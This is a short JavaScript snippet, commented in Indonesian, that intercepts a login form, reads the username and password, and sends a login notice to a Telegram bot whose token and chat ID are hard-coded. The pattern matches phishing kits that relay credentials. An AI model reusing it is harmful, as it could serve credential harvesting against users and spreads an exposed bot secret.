document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Kirim data login ke bot Telegram
    sendDataToTelegram(`User ${username} has logged in.`);
});

function sendDataToTelegram(data) {
    const telegramBotToken = '6784104621:AAEVRyReTRmVtL_eGnFIZLbYm3FGkI0zF9m';
    const chatId = '7120969628';

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${data}`)
        .then(response => {
            if (response.ok) {
                alert('Login data sent to Telegram successfully!');
            } else {
                alert('Failed to send login data to Telegram.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
              }
